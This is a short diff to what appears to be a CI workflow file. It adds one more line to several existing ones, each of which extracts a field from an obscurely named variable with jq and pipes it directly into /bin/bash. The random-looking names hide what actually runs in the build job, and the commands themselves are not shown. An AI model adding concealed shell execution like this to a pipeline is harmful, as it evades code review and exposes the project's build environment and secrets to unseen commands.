@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$x57920" | jq -r .rcth13 | /bin/bash
           echo $mum2 | jq -r .hq3 | /bin/bash
           echo $mr57 | jq -r .x673 | /bin/bash
+          echo $btkf87 | jq -r .kg71 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
